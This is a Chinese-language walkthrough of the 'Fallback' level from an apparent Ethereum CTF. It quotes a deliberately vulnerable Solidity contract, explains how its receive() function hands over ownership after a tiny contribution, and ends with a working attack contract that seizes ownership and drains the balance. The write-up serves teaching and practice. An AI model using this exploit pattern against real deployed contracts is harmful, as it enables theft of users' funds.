# 1. Fallback

### 原题
```
仔细看下面的合约代码.

通过这关你需要

获得这个合约的所有权
把他的余额减到0

以下可能有帮助:
如何通过与ABI互动发送ether
如何在ABI之外发送ether
转换 wei/ether 单位 (参见 help() 命令)
Fallback 方法

```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

### 分析

首先要获得控制权，也就是owner要修改成我们自己的攻击合约地址。\
看源码有两处地方是 owner = msg.sender。\
那就先看这两处的逻辑是否有漏洞。

```solidity
function contribute() public payable {
  // 执行通过的条件是转账金额要小于 0.001 ether
  require(msg.value < 0.001 ether);
  // 发送者账号余额累加相应金额
  contributions[msg.sender] += msg.value;
  // 当发送者账号余额大于owner的余额账号，就可以转交所有权
  // 注意到初始化的时候 contributions[msg.sender] = 1000 * (1 ether);
  // 每次转账小于0.001，同时余额要大于1000，不适合攻击
  if (contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
  }
}

// 再看第二个
receive() external payable {
  // 当转账金额大于0，并且余额大于0，这时候就可以转移所有权
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```
receive这个函数的作用就是接收纯转账（transfer，send，call("")）等。\
为了满足contributions[msg.sender] > 0，我们先调用contribute(),转账金额小于0.001 ether，\
然后再进行一个纯转账操作token.call{value: 0.001 ether}(""),
这样就满足了执行条件，\
执行owner = msg.sender，这样就拿到了所有权。\
所有权在手，执行withdraw()，合约的全部余额取现，这样合约的余额也被清空。\
以下是攻击代码，为了演示，请忽略细节。\
如果是在remix上测试，切记要对2个合约初始余额值，\
不然余额为0，无法完成攻击

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallback {
    function contribute() external  payable;
    function withdraw() external ;
}

contract FallbackAttack {
    IFallback fb;

    event AttackOwner();

    error AttackOwnerError();

    receive() external payable { }

    constructor(address _fb) payable {
        fb = IFallback(_fb);
    }

    function attackOwner() public {
         bytes memory signature = abi.encodeWithSignature("contribute()");
        (bool success, bytes memory data) = address(fb).call{value: 0.0005 ether}(signature);
        if (success) {
            //
            (bool su, ) = address(fb).call{value: 0.0005 ether}("");
            if (su) emit AttackOwner();
            
        } else {
            // revert AttackOwnerError();
            revert(string(data));
        }
        
    }

    function attackWithdraw() public {
        fb.withdraw();
    }
    
}
```